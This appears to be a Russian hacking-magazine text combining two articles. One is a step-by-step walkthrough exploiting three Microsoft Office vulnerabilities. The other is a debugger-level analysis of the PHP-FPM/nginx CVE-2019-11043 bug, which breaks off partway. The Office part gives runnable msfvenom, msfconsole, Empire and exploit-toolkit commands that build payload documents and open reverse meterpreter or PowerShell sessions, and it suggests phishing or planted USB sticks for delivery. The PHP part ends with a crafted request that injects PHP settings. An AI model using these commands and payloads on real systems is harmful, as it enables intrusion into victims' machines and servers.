         Иван Пискунов    ЗА ПОСЛЕДНЕЕ ВРЕМЯ





В этой статье мы разберем несколько далеко не новых, но в
свое время нашумев ших критических уязвимостей в офис‐
ных программах Microsoft. Под них уже давно есть модули
Metasploit и куча заготовок на GitHub. Однако непропат‐
ченный Oﬃce —  это  по‐прежнему  бич  корпоративной
безопасности и путь на компьютер пользователей.


НЕКОРРЕКТНАЯ ОБРАБОТКА ОТВЕТОВ ОТ OLE (CVE-2017-8570)
В основе этого бага лежит ошибка, связанная с некорректной обработкой
ответов от сервера в функции Microsoft OLE (Object Linking and Embedding),
которая дает возможность встраивать одни документы внутрь других. Фича,
конечно, полезная, но крайне небезопасная.
   Когда зараженный документ открывают, при ложе ние делает  запрос
на удаленный сервер, чтобы получить встроенный в этот документ файл. Сер‐
вер возвращает специально сформированный ответ. В нем содержится
вpедоносный файл HTA, произволь ный код из которого после загрузки
выпол няется на целевой системе.
  Об этой проблеме стало извес тно в апреле 2017 года, а в августе произо‐
шел еще один важный эпизод: спецы из аналитичес кого отдела Cisco расска‐
зали о новой уязвимости, связанной с этой, — CVE‐2017‐0199. Если ранее
для атак использовались документы Rich Text File (RTF), то новая угроза отно‐
силась к файлам PowerPoint (.ppsx).


Прин цип работы
Атака, использующая эту уяз вимость, развивается по весьма прос тому сце‐
нарию: пользователю приходит пись мо с вредоносным документом Word
и обманом заставляет жертву открыть вло жения. Внут ри документа скрывает‐
ся объект OLE2link. Если жертва использует Protected View, то экс плоит
не сработает, но вот если этот режим выключен, то на сервер атакующих
уйдет HTTP‐запрос, который подгру зит файл HTA, замаскированный под RTF.





         Загрузка файла HTA, замаскированного под документ RTF





  Листинг дампа в дизас семблере, демонстрирующий «опас ную начинку»

Когда файл HTA подгрузит ся, он будет выполнен авто матически. Таким обра‐
зом эксплоит срабатывает, а исходный документ Word будет закрыт. Вмес то
него откроется документ‐фальшивка, предназна ченный для усыпления бди‐
тельности жертвы.


Эксплу атация
Первым делом идем на GitHub и смотрим экс пло иты. Я буду пользоваться ва‐
риантом пользователя tezukanice. Создаем в директории Office8570 папку
template и переносим в нее ска чанный нами файл template.ppsx.





                     Подготовительный этап

Теперь запускаем скрипт, что бы сгенерировать файл PPSX с полезной наг‐
рузкой:



  $ python cve‐2017‐8570_toolkit.py ‐M gen ‐w Invoice.ppsx ‐u http://192.
  168.0.104/logo.doc


Указываем IP жертвы (в моем случае это 192.168.0.104) и видим, что появил‐
ся файл Invoice.ppsx.





                Генерируем файл с полезной нагрузкой

Далее, используя  Metasploit, соз даем полезную нагрузку в виде файла
shell.exe в катало ге tmp:



  $ msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=192.168.0.104
  LPORT=4444 ‐f exe > /tmp/shell.exe


Дело сделано, теперь запускаем слушатель, который будет чекать порт:



  $ msfconsole ‐x "use multi/handler; set PAYLOAD windows/meterpreter/re‐
  verse_tcp; set LHOST 192.168.0.104; set LPORT 4444; run"


Чтобы все заработало, нам остается сделать еще одно действие — про‐
писать команду на запуск локального сервера на 80‐м порте.



  $ python cve‐2017‐8570_toolkit.py ‐M exp ‐e http://192.168.0.104/shell.
  exe ‐l /tmp/shell.exe


И заключительный шаг — необходимо передать инфи цированный файл пре‐
зентации PowerPoint (Invoice.ppsx) на машину жертвы. Как — уже дру гой
вопрос. Можно  подготовить фишинговое  пись мо,  подбросить флешку
или еще что‐нибудь в таком духе. Ког да жертва откроет файл на своей
машине, отработает экспло ит, и мы получим виндовый шелл.
  Демонстрацию бага можешь наблюдать на видео.





ПЕРЕПОЛНЕНИЕ БУФЕРА В РЕДАКТОРЕ ФОРМУЛ (CVE-2017-
11882)
Этот опасный баг, который поз воляет выпол нить код без взаимодействия
с пользователем, существовал 17 (семнадцать!) лет.
  Иссле дователи объясня ют, что проб лема связана с работой Microsoft
Equation Editor (EQNEDT32.EXE). Казалось бы, это же безобидный редактор
формул! Но скомпилиро ван этот файл в пос ледний раз был аж 9 нояб‐
ря 2000 года. Разумеется, он не соответс твует современным стандартам
безопасности. В Oﬃce 2007 этот компонент заменили новой версией, но ста‐
рую убирать не стали — людям же нуж но открывать старые документы, вер‐
но?





Аналитики компании Embedi обнаружили в EQNEDT32.EXE сразу два бага,
связанных с нарушением целостнос ти данных в памяти (переполнение
буфера). Внедрение в документ вредоносных объ ектов OLE, эксплу ати‐
рующих эти уязвимости, позволяет выполнить на машине произвольный код,
в том числе скачать любой файл с удаленного сервера и выпол нить его. Неп‐
лохо, да?


Эксплу атация
И снова нам поможет готовый экспло ит с GitHub, спасибо за него парню
с никнеймом Ridter. Клониру ем репози торий и делаем скрипты исполняемы‐
ми:



  $ git clone https://github.com/Ridter/CVE‐2017‐11882
  $ cd CVE‐2017‐11882
  $ chmod +x Command109b_CVE‐2017‐11882.py
  $ chmod +x Command43b_CVE‐2017‐11882.py


Теперь нам понадобится еще один хакерский фреймворк — Empire. С его
помощью мы создадим слушателей. На случай, если ты не знаком с Empire,
поясню, что «слушатель» (listener) представлен нашим IP и портом, где мы
будем встречать соединение с машины жертвы.
   Скачиваем Empire:



  $ git clone https://github.com/adaptivethreat/Empire.git


Теперь можешь запустить и глянуть доступные команды, набрав help.





Для создания слушателей пишем следующие команды:



  listeners
  uselistener http


Задаем начальные установки:
 • set <Name http> — задать имя слушателя HTTP;
 • set <Host ip> — пишем айпишник, куда обра щаться;
 • set <Port> — пишем, на какой порт стучать;
 • execute.

Когда все будет сделано, воз вра щаемся в главное меню с помощью команды
main.





                   Возвращаемся в главное меню

Создаем нагрузку HTA следующими командами:
 • usestager windows/hta — юзаем нужный нам модуль;
 • set Listener http — активиру ем лис тенер HTTP;
 • set OutFile /tmp/hack1.hta — ука зываем путь к сох ранению фай ла
   и задаем ему неброское имя;
 • execute — завершаем генера цию и выходим из меню.





                       Создаем нагрузку

Почти все сде лано! Теперь нужно перейти в /tmp и забрать оттуда наш
боевой файл hackl.hta. Его‐то мы и будем запус кать на машине жертвы.


             INFO

                   Формат HTA (HTML Application) позволяет откры‐
                         вать докумен ты HTML без браузера. Запускает
                        такие приложения mshta.exe, где используется
                     функция  RunHTMLApplication  (недокумен‐
                       тирован ная).  За  этим  исполня емым  файлом
                        в Windows по умолчанию зак реплено расширение
                              .hta.


Поскольку не любой юзер отважится запускать на сво ей тачке HTA, мы завер‐
нем его в документ Word. Документы ведь безобидны, это знает каждый!
  Возвращаемся в консоль и пишем следующее:



  $ python Command109b_CVE‐2017‐11882.py ‐c "mshta <link>" ‐o Example.rtf


Здесь mshta <link> — это URL файла hack1.hta, который лежит на нашем
сервере.
   Теперь файл нужно дос тавить до целевой машины. Как только он будет
открыт,  поднимется  соединение,  по  которому  мы  получаем  доступ
к PowerShell.





                     Коннект к машине жертвы


ЭКСПЛУАТАЦИЯ DDE (CVE-2017-11826)
10 октября 2018 года исследова тели из китайской компании Qihoo 360 сооб‐
щили об уязвимости нулево го дня в Microsoft Oﬃce, которую злоумышленники
уже активно эксплуатирова ли: устро или кампанию, нацеленную на пред при‐
ятия. Атака отличалась тем, что не использовала объекты OLE или макросы.


Де монстрация
С точки зрения жертвы ата ка выглядит следующим образом. При ходит пись‐
мо с вложенным документом, открываем и видим следующее сообщение.





Если нажать на кнопку Yes, то появит ся дру гое сообщение.





И еще одно.





Ниже — дре вовидное представление процесса. Такое можно наблюдать
при корректной работе экс пло ита.





    Загрузка и выполнение вредоносной прог раммы из документа Word


Прин цип работы
Техника этой атаки основана на довольно ста рой функции Microsoft Dynamic
Data Exchange (DDE), которая позволяет одним при ложе ниям Oﬃce загружать
данные из других. К примеру, таблица в файле Word может автоматически
обновляться при каждом запуске фай ла, и данные будут подтягиваться
из файла Excel.
   Как правило, при сра батывании DDE приложение показывает пользовате‐
лю два предупреждения, которые можно увидеть на иллюстрации ниже. При‐
чем специалисты отмечают, что вто рое предупреждение, информирующее
об ошибке, может отоб ражать ся далеко не всегда.





Основная проблема здесь в том, что пользователи, которые часто работают
с DDE, не обращают никакого внимания на эти сообщения. Такие предуп‐
реждения уже стали чем‐то нас только привычным, что их закрывают не глядя.
  Иссле дователи, среди которых сотрудники компаний SensePost и Cisco
Talos, не раз отмечали, что DDE часто эксплуатируется хакерами, и пытались
донести проблему до специалистов Microsoft, но те дол го отказывались приз‐
нать это уязвимостью, пока наконец не выпус тили патч ADV170021, закрыва‐
ющий дыру.
  Возможность эксплуатации DDE для атак действительно не уязвимость
в привычном смысле это го сло ва. Ведь Oﬃce чес тно предупреждает поль‐
зователя о потенциальной опас ности. Ситуация почти аналогична проб лемам
с макросами и OLE.
  Тем временем атаки с использованием DDE вовсю практикуют серьезные
хакерские группы, в частности FIN7, извес тная широкомасштабными атаками
на финансовые организации. И существо вание пат ча пре пятствует этому,
но установ лен он по‐прежнему далеко не везде.


           DDEКак вклю чить    обратно
В сущности, патч лишь вносит небольшие изменения в реестр и деактивирует
DDE по умолчанию. Что бы сно ва включить эту функцию, достаточно поменять
значение одного клю ча:


 \HKEY_CURRENT_USER\Software\Microsoft\Office\version\Word\Security
 AllowDDE(DWORD)


Значение этого dword может быть одним из следующих:
 • AllowDDE(DWORD) = 0 — отклю чает DDE. Пос ле установки обновления
   это значение стоит по умолчанию;
 • AllowDDE(DWORD) = 1 — разрешает запросы DDE к уже запущенным
   программам, но не допус кает запуска новых;
 • AllowDDE(DWORD) = 2 — раз реша ет любые зап росы.




Эксплу атация
Давай посмотрим, как получить активную сес сию meterpreter на удаленном
хосте (Windows 8.1, Windows 7, Windows Server 2008). Для этого мы исполь‐
зуем скрипт на Python, который генерирует файл RTF. Все необходимое вклю‐
чено в Metasploit Framework.
  Соответствующий модуль соз дает вредоносный RTF — если открыть его
в уязвимых версиях Word, выполнится код. Уязвимость состоит в том, что объ‐
ект OLE может сделать запрос HTTP(S) и выполнить код HTA в ответ.
  Приступим к эксплуата ции.



  > use exploit/windows/fileformat/office_word_hta
  > set srvhost 192.168.0.106
  > set payload windows/meterpreter/reverse_tcp
  > set filename order.doc
  > set lhost 192.168.0.106
  > exploit





Выделенная красным ссылка должна быть дос тавлена на целевой хост.





Если по ней перейти и запус тить скачанный файл, откроется активная сессия
meterpreter.





Набираем sysinfo, чтобы убедиться, что это победа.





ВЫВОДЫ
Мы изучили три серьезные уязвимос ти, которые вовсю эксплуатируются зло‐
умышленниками. Все три бага уже в той или иной мере закрыты патчами
и имеют некоторые ограничения, но ста рые версии Oﬃce настолько рас‐
пространены, что и уязвимости еще долгое время будут оставаться акту аль‐
ными.
  Помни: обновления — это вовсе не прихоть Microsoft, ставить патчи —
одно из обязательных усло вий безопас ности. Но далеко не единственное.
Между обнаружением проблемы и ее устранением иногда проходят месяцы,
поэтому, даже если ты исправно ставишь апдейты, вероятность нарваться
на документ с сюрпризом всегда оста ется.
ВЗЛОМ
    КАК
 ПОДЧИНИТЬ
  КОНФИГ





                                                 aLLy
                                              ONsec
                                                    @iamsecurity


             УЧИМСЯ
         ЭКСПЛУАТИРОВАТЬ
       НОВУЮ УЯЗВИМОСТЬ
         В PHP‐FPM И NGINX





Недавно в связке из nginx и PHP‐FPM, которая нередко
встречается на веб‐серверах, мои  коллеги обнаружили
опасную уязвимость. Созданный ими эксплоит поз воляет
изменить настройки PHP, внедрив переменные окружения,
а цепочка таких настроек приведет к удаленному выпол‐
нению кода. Давай разбираться, где же там накосячили раз‐
работчики PHP.


Впервые аномальное поведение было обнаружено Андреем @d90pwn Данау
во время квалификации Real World CTF 2019. Сервер странно реагировал
на отправленный в URL символ перево да стро ки (%0a). Этой идеей заин‐
тересовались Омар @beched Ганиев и Эмиль @neex Лернер. Эмиль разоб‐
рался, почему  так происходит, нашел спо соб эксплуатации и написал
рабочий эксплоит, а Омар довел этот баг до получения RCE.
   Суть проблемы сводится к тому, что в некоторых конфигурациях FPM зло‐
умышленник может выполнить атаку типа buﬀer underﬂow и осуществить
запись в адресное пространс тво, зарезервированное для данных протокола
FastCGI. Это позволит выполнять произвольные команды на целевой сис‐
теме.
   Уязвимость получила идентифика тор CVE‐2019‐11043 и провокацион ное
название PHuiP‐FPizdaM. Для экс плуата ции атакующе му не нужно никаких
прав, поэтому баг имеет критический статус. Проблема присутствует в обеих
ветках PHP — 5 и 7, одна ко из‐за особенностей оптимизации эксплуатация
возможна только в PHP седь мой версии.


             INFO

                     Полный список уяз вимых версий:
                  •PHP ветки 7.1.x — все версии ниже 7.1.33;
                  •PHP ветки 7.2.x — все версии ниже 7.2.24;
                  •PHP ветки 7.3.x — все версии ниже 7.3.11.



СТЕНД
Для начала нам нужен стенд. Я буду использовать уже полюбившиеся контей‐
неры Docker. Если не хочешь возиться с отладкой, то можно прос то запустить
готовое окружение с vulhub.


docker-compose.yml
version: '2'
services:
  nginx:
    image: nginx:1
    volumes:
      ‐ ./www:/usr/share/nginx/html
      ‐ ./default.conf:/etc/nginx/conf.d/default.conf
    depends_on:
      ‐ php
    ports:
      ‐ "8080:80"
  php:
    image: php:7.2.10‐fpm
    volumes:
      ‐ ./www:/var/www/html

Запускается простой командой docker‐compose up ‐d.
  Я  собираюсь  посмотреть  на  уязвимость  поб лиже,  поэтому  будем
собирать PHP из исходников. Для начала запускаем Debian.


$ docker run ‐‐rm ‐ti ‐‐cap‐add=SYS_PTRACE ‐‐security‐opt seccomp=
unconfined ‐‐name=phprce ‐‐hostname=phprce ‐p80:80 debian /bin/bash
$ apt update

Теперь позаботимся об установке нужных пакетов.


$ apt install ‐y build‐essential git autoconf automake libtool re2c
bison libxml2‐dev libgd‐dev curl gdb libssl‐dev nginx vim nano

Возьмем последнюю уязвимую версию PHP — 7.3.10.


$ cd ~
$ git clone ‐‐depth=1 ‐‐branch PHP‐7.3.10 https://github.com/php/
php‐src.git
$ cd php‐src

Сконфигурируем PHP с поддержкой PHP‐FPM.


$ ./buildconf ‐‐force
$ ./configure ‐‐enable‐debug ‐‐enable‐fpm ‐‐with‐openssl
‐‐with‐fpm‐user="www‐data" ‐‐with‐fpm‐group="www‐data"

Теперь дело за компиляцией и уста новкой. Здесь все стандартно.


$ make
$ make install

Меняем имена стандартных конфигурационных файлов.


$ mv /usr/local/etc/php‐fpm.conf.default /usr/local/etc/php‐fpm.conf
$ mv /usr/local/etc/php‐fpm.d/www.conf.default /usr/local/etc/
php‐fpm.d/www.conf

Далее изменяем путь до папки, где находят ся конфиги.


$ sed ‐s ‐i 's/=NONE/=\/usr\/local/' /usr/local/etc/php‐fpm.conf

В конфиге PHP‐FPM  (/usr/local/etc/php‐fpm.d/www.conf) настраиваем
количество дочерних про цессов. Что бы было про ще отлаживать, рекомендую
поставить 1.


pm = static
pm.max_children = 1

Теперь дело за файлами конфигура ции для nginx.


/etc/nginx/sites-enabled/default
server {
    listen 80 default_server;
    listen [::]:80 default_server;


    root /var/www/html;


    index index.html index.php;


    server_name _;


    location ~ [^/]\.php(/|$) {
        fastcgi_split_path_info ^(.+?\.php)(/.*)$;


        include fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_
name;
        fastcgi_param PATH_INFO       $fastcgi_path_info;
        fastcgi_param PATH_TRANSLATED $document_root$fastcg
i_path_info;


        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
    }
}

В fastcgi_pass указан адрес нашего PHP‐FPM, по умол чанию он висит
на 9000‐м порте. Некото рые час ти конфига я поясню, когда буду разбирать
уязвимость.
  Затем нужно создать файл PHP в корне веб‐сервера (/var/www/html/).
Тут подойдет даже пустой скрипт, главное, чтобы он имел рас ширение .php
и nginx отправлял его к PHP. Я соз дал index.php, который выводит при ветс‐
твие.


/var/www/html/index.php
<?php
echo 'Hi there!';

Теперь все готово, можно запускать nginx.


$ service nginx start

А затем и PHP‐FPM через отладчик.


$ gdb ‐‐args php‐fpm ‐‐nodaemonize

Для GDB включаем возможность отлаживать дочерние процес сы и запускаем
сервис.


set follow‐fork‐mode child
r





               Готовый к работе стенд с PHP‐FPM и nginx


ДЕТАЛИ УЯЗВИМОСТИ
Первым делом заглянем в коммит, который патчит уязвимость.





     Коммит, который патчит уяз вимость CVE‐2019‐11043 в PHP 7.3.10


/php-src-php-7.3.10/sapi/fpm/fpm/fpm_main.c
1151: path_info = env_path_info ? env_path_info + pilen ‐ slen : NULL
;
1152: tflag = (orig_path_info != path_info);


/php-src-php-7.3.11/sapi/fpm/fpm/fpm_main.c
1151: path_info = (env_path_info && pilen > slen) ? env_path_info +
pilen ‐ slen : NULL;
1152: tflag = path_info && (orig_path_info != path_info);

Как видишь, добавлены дополнитель ные проверки для переменных path_in‐
fo и tflag. В этой части кода обрабатываются пути вида /info.php/test.
  Поставим брейк‐пойнт чуть выше запатченных строк, на строке 1143,
и попробуем отправить GET‐запрос с байтом переноса строки (%0a).


http://phprce.vh/index.php/path%0Ainfo.php


/php-src-php-7.3.10/sapi/fpm/fpm/fpm_main.c
1141: int ptlen = strlen(pt);
1142: int slen = len ‐ ptlen;
1143: int pilen = env_path_info ? strlen(env_path_info) : 0;
1144: int tflag = 0;





  Отработал брейк‐пойнт в функции init_request_info после отправки бай ‐
  та 0x0a

Разумеется, сначала URL попадает в nginx. Напомню строчку из конфига.


default
location ~ [^/]\.php(/|$) {
    fastcgi_split_path_info ^(.+?\.php)(/.*)$;

Переданный байт переноса стро ки лома ет логику регулярного выражения
в директиве fastcgi_split_path_info. В результате переменная env_path_info
принимает пустое значение, и pilen ста новится равной 0. Затем на основе
этих значений высчитывается path_info.


/php-src-php-7.3.10/sapi/fpm/fpm/fpm_main.c
1151: path_info = env_path_info ? env_path_info + pilen ‐ slen : NULL
;

Когда запрашиваемый файл не удается найти, PHP‐FPM идет выше по URI
и пытается заново отправить запрос на стоящий выше скрипт, если такой
есть. Определяется по знакам /. Таким образом, если я запрошу http://ph‐
prce.vh/index.php/info.php,  то  отра бота ет  скрипт  index.php,  так
как info.php у меня отсутству ет.





  PHP‐FPM передает управление стоящему выше скрипту, если не найден
  запрашиваемый


/php-src-php-7.3.10/sapi/fpm/fpm/fpm_main.c
1113: if (script_path_translated &&
1114:     (script_path_translated_len = strlen(script_path_translated
)) > 0 &&
1115:     (script_path_translated[script_path_translated_len‐1] == '/
' ||
1116:     (real_path = tsrm_realpath(script_path_translated, NULL))
== NULL)
1117: ) {
1118:     char *pt = estrndup(script_path_translated, script_path_tra
nslated_len);
1119:     int len = script_path_translated_len;
1120:     char *ptr;
1121:
1122:     if (pt) {
1123:         while ((ptr = strrchr(pt, '/')) || (ptr = strrchr(pt,
'\\'))) {
1124:             *ptr = 0;
1125:             if (stat(pt, &st) == 0 && S_ISREG(st.st_mode)) {

Поэтому есть две переменные: script_path_translated — пол ный URI
и pt — путь до скрипта выше. В нашем случае они имеют длину 37 (0x25) и 23
(0x17) байта соответственно.
 • script_path_translated —  /var/www/html/index.php/path\
  ninfo.php
 • pt — /var/www/html/index.php





              Переменные пути до скриптов и их длина

На основе этих переменных считается slen.


/php-src-php-7.3.10/sapi/fpm/fpm/fpm_main.c
1119: int len = script_path_translated_len;
...
1141: int ptlen = strlen(pt);
1142: int slen = len ‐ ptlen;

А затем высчитывается path_info.





        Переменные, на основе которых высчитывается path_info


/php-src-php-7.3.10/sapi/fpm/fpm/fpm_main.c
1151: path_info = env_path_info ? env_path_info + pilen ‐ slen : NULL
;

Сейчас в выражении env_path_info + pilen ‐ slen только slen отлична
от нуля (0xe). Поэто му path_info будет указывать не туда, куда нужно, а на
адрес, который располагается выше. В моем слу чае это строка 200 по адре су
0x555556618672. Такая уяз вимость называется buﬀer underﬂow.


0x555556618680 (реальный адрес значения path_info) ‐ 0x0e (slen) =
0x555556618672





   Оригинальный адрес значения path_info и адрес после buﬀer underﬂow

Если посмотреть на код функции init_request_info дальше, то увидим
любопытный кусок.


/php-src-php-7.3.10/sapi/fpm/fpm/fpm_main.c
1161: path_info[0] = 0;

Так как мы управляем длиной slen, то смо жем записать null‐байт в любую
позицию выше PATH_INFO. Что бы понять, что из этого можно извлечь, нужно
разобраться, как PHP‐FPM работа ет с переменными окружения. Если пос‐
мотреть код чуть даль ше, то мы увидим, что там устанавливается одна
из них — ORIG_SCRIPT_NAME.


/php-src-php-7.3.10/sapi/fpm/fpm/fpm_main.c
1165: FCGI_PUTENV(request, "ORIG_SCRIPT_NAME", orig_script_name);

Функция FCGI_PUTENV инициализирована как fcgi_quick_putenv.


/php-src-php-7.3.10/main/fastcgi.h
41: #define FCGI_PUTENV(request, name, value) \
42:   fcgi_quick_putenv(request, name, sizeof(name)‐1, FCGI_HASH_FUNC
(name, sizeof(name)‐1), value)

Если ты посмотришь на ее код, то увидишь, что она напрямую модифицирует
req‐>env.


/php-src-php-7.3.10/main/fastcgi.c
1705: char* fcgi_quick_putenv(fcgi_request *req, char* var, int
var_len, unsigned int hash_value, char* val)
1706: {
1707:   if (val == NULL) {
1708:     fcgi_hash_del(&req‐>env, hash_value, var, var_len);
1709:     return NULL;
1710:   } else {
1711:     return fcgi_hash_set(&req‐>env, hash_value, var, var_len,
val, (unsigned int)strlen(val));
1712:   }
1713: }

Эта конструкция инициализиру ется в самом начале работы с запросом фун‐
кцией fcgi_hash_init.


/php-src-php-7.3.10/main/fastcgi.c
880: fcgi_request *fcgi_init_request(int listen_socket, void(*on_acc
ept)(), void(*on_read)(), void(*on_close)())
881: {
...
910:   fcgi_hash_init(&req‐>env);


/php-src-php-7.3.10/main/fastcgi.c
256: static void fcgi_hash_init(fcgi_hash *h)
257: {
258:   memset(h‐>hash_table, 0, sizeof(h‐>hash_table));
259:   h‐>list = NULL;
260:   h‐>buckets = (fcgi_hash_buckets*)malloc(sizeof(fcgi_h
ash_buckets));
261:   h‐>buckets‐>idx = 0;
262:   h‐>buckets‐>next = NULL;
263:   h‐>data = (fcgi_data_seg*)malloc(sizeof(fcgi_data_seg) ‐ 1 +
FCGI_HASH_SEG_SIZE);
264:   h‐>data‐>pos = h‐>data‐>data;
265:   h‐>data‐>end = h‐>data‐>pos + FCGI_HASH_SEG_SIZE;
266:   h‐>data‐>next = NULL;
267: }

Здесь видим, что req‐>env — это структура fcgi_data_seg.


/php-src-php-7.3.10/main/fastcgi.c
188: typedef struct _fcgi_data_seg {
189:   char                  *pos;
190:   char                  *end;
191:   struct _fcgi_data_seg *next;
192:   char                   data[1];а
193: } fcgi_data_seg;

В этой структуре хранятся гло бальные переменные, необходимые для ком‐
муникации процесса PHP‐FPM и веб‐сервера (в моем слу чае — nginx). Здесь
pos указывает на адрес текущего буфера, end — на адрес, где он заканчива‐
ется, а data — на то мес то, куда нужно записывать данные. Когда блок
памяти, выделенный под структуру, заканчива ется (pos больше end), то соз‐
дается новая, а адрес текущей записывается в next.
  Например, вот так выглядит эта структура для текущего запроса и данные,
которые в ней хранятся.





            Структура fcgi_data_seg текущего запроса и данные

Там находится и наш PATH_INFO. Обрати внимание на адрес pos, он рас‐
положен выше, поэтому можно уста новить указатель на него и записать туда
null‐байт.





               Заголо вок структуры в памяти PHP‐FPM

Но сначала необходимо создать новую структуру fcgi_data_seg. Для этого
нужно заполнить свободную память в текущем блоке. Если я буду добавлять
символы в путь, то станет меняться и slen. Если еще раз глянуть конфиг ng‐
inx, то мы увидим там QUERY_STRING. В моей конфигурации она объ является
раньше, чем PATH_INFO, а зна чит, и в памяти будет рас полагаться выше.


/etc/nginx/fastcgi_params
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
...




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

      КАК ПОДЧИНИТЬ
           КОНФИГ
               УЧИМСЯ ЭКСПЛУАТИРОВАТЬ НОВУЮ
                 УЯЗВИМОСТЬ В PHP‐FPM И NGINX




Поэтому основной мусор передам через параметры к скрипту. Идея в сле‐
дующем: нужно, манипу лируя час тями URL, добиться того, чтобы значение
PATH_INFO попадало в новый блок памяти. Тогда между адресом значения
PATH_INFO и новым request.env.data.pos будет 34 байта.
   Так как мы точно знаем это зна чение, то можем использовать buﬀer under‐
ﬂow. С его помощью пос тавим указатель path_info на request.env.data.
pos. У меня получился следующий URL, в твоем случае он может быть другим
из‐за разницы в адресации памяти. Разница будет в количестве символов А.


http://phprce.vh/index.php/anything%0Athis_value_you_can_see;
?AAAAAAA...

Дальше идет еще 1750 букв A. Не буду приводить их все, чтобы не было
похоже на твиттер в день появления смешного мема.
   Установим брейк‐пойнт на строку, где происходит запись  null‐байта
(b fpm_main.c:1161) , и отпра вим запрос. Теперь path_info указывает
на адрес 0x5555566194a0, а это и есть request.env.data.pos.





         Хидер новой структуры fcgi_data_seg до перезаписи pos

Сделаем шаг вперед и пос мотрим на сос тояние структуры теперь.




      Заголовок новой структуры fcgi_data_seg после перезаписи pos

Указатель pos изменился, теперь он имеет значение 0x555556619400. Даль‐
ше, как ты уже знаешь, вызывается FCGI_PUTENV и добавляется строка
ORIG_SCRIPT_NAME и контролиру емое нами значение из orig_script_name.





           Добавленная в переменные окру жения строка


/php-src-php-7.3.10/sapi/fpm/fpm/fpm_main.c
1165: FCGI_PUTENV(request, "ORIG_SCRIPT_NAME", orig_script_name);

Итак, теперь можно добавлять свои переменные. Нас интересу ет PHP_VALUE.
С ее помощью можно менять нас тройки PHP.


/php-src-php-7.3.10/sapi/fpm/fpm/fpm_main.c
1336: ini = FCGI_GETENV(request, "PHP_VALUE");
1337: if (ini) {
1338:   int mode = ZEND_INI_USER;
1339:   char *tmp;
1340:   spprintf(&tmp, 0, "%s\n", ini);
1341:   zend_parse_ini_string(tmp, 1, ZEND_INI_SCANNER_NORMAL, (
zend_ini_parser_cb_t)fastcgi_ini_parser, &mode);
1342:   efree(tmp);
1343: }

Только вот не все так просто. PHP‐FPM хранит каждую переменную окру‐
жения в структуре fcgi_hash_bucket.


/php-src-php-7.3.10/main/fastcgi.c
172: typedef struct _fcgi_hash_bucket {
173:   unsigned int              hash_value;
174:   unsigned int              var_len;
175:   char                     *var;
176:   unsigned int              val_len;
177:   char                     *val;
178:   struct _fcgi_hash_bucket *next;
179:   struct _fcgi_hash_bucket *list_next;
180: } fcgi_hash_bucket;

Все они хранятся в fcgi_hash_buckets, и в отладчике их можно посмотреть
командой p *request.env.buckets.


/php-src-php-7.3.10/main/fastcgi.c
182: typedef struct _fcgi_hash_buckets {
183:   unsigned int               idx;
184:   struct _fcgi_hash_buckets *next;
185:   struct _fcgi_hash_bucket   data[FCGI_HASH_TABLE_SIZE];
186: } fcgi_hash_buckets;

Здесь можно обнаружить добавленную нами переменную.





  Добавленная через уяз вимость переменная окру жения
  в fcgi_hash_buckets

Наверное, ты уже заметил проблему: целостность структуры наруше на.
Как минимум не совпадают длина переменной  (var_len) и ее значения
(val_len). PHP‐FPM проверяет целостность и такого жесткого вмешатель‐
ства не потерпит.
   Заглянем в FCGI_GETENV.


/php-src-php-7.3.10/main/fastcgi.h
38: #define FCGI_GETENV(request, name) \
39:   fcgi_quick_getenv(request, name, sizeof(name)‐1, FCGI_HASH_FUNC
(name, sizeof(name)‐1))


/php-src-php-7.3.10/main/fastcgi.c
1687: char* fcgi_quick_getenv(fcgi_request *req, const char* var, int
 var_len, unsigned int hash_value)
1688: {
1689:   unsigned int val_len;
1690:
1691:   return fcgi_hash_get(&req‐>env, hash_value, (char*)var,
var_len, &val_len);
1692: }

Сначала вызывается FCGI_HASH_FUNC. Функция подсчитывает хеш на основе
некоторых данных перемен ной окру жения.


/php-src-php-7.3.10/main/fastcgi.h
31: #define FCGI_HASH_FUNC(var, var_len) \
32:   (UNEXPECTED(var_len < 3) ? (unsigned int)var_len : \
33:     (((unsigned int)var[3]) << 2) + \
34:     (((unsigned int)var[var_len‐2]) << 4) + \
35:     (((unsigned int)var[var_len‐1]) << 2) + \
36:     var_len)

Я хочу добавить PHP_VALUE. Подсчитаем ее хеш:


('_'<<2) + ('U'<<4) + ('E'<<2) + 9 = 2025





                    Подсчет хеша PHP_VALUE

Нужно найти название, которое будет давать такой же хеш. Добавлять
переменные можно, используя хидеры в запросе. Если передать любое
незарезервированное имя, то оно получит префикс HTTP_.





               Кастомный хидер TEST в fcgi_hash_buckets

Исходя из формулы первое значение будет равно ('P' << 2) = 320, длина
должна быть рав на 9 (как у PHP_VALUE).


320 + x + y + 9 = 2025
x + y = 1696

Естественно, возможных вариантов очень много. Возьмем, например, SLUT.
Теперь, когда мы заменим этот добавленный заголовок на переменную PHP_‐
VALUE, все проверки будут пройдены.


/php-src-php-7.3.10/main/fastcgi.c
386: static char *fcgi_hash_get(fcgi_hash *h, unsigned int hash_value
, char *var, unsigned int var_len, unsigned int *val_len)
387: {
388:   unsigned int      idx = hash_value & FCGI_HASH_TABLE_MASK;
389:   fcgi_hash_bucket *p = h‐>hash_table[idx];
390:
391:   while (p != NULL) {
392:     if (p‐>hash_value == hash_value &&
393:       p‐>var_len == var_len &&
394:       memcmp(p‐>var, var, var_len) == 0) {
395:       *val_len = p‐>val_len;
396:       return p‐>val;
397:     }
398:     p = p‐>next;
399:   }
400:   return NULL;
401: }

Остается только точно попасть в адрес. Для это го воспользуемся еще одним
заголовком, который будет играть роль паддинга. Он будет подталкивать
переданную строку в нужное место. Обрати внимание, что он должен быть
перед заголовком Slut. Если пос мотреть память, то там хидеры рас полага‐
ются в том же порядке, в котором были переданы в запросе.
  Для теста я возьму опцию session.auto_start=1. Если она будет внед‐
рена, то сервер вернет cookie с сес сией. У меня получился такой реквест.
Для перебора я просто добавлял символы a в Pimp и результат кон тролиро‐
вал через отладчик с помощью p request.env.buckets.


GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;?AAAAAAA… HTTP/1.1
Content‐Length: 11
Host: phprce.vh
Connection: close
Pimp: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Slut: was here

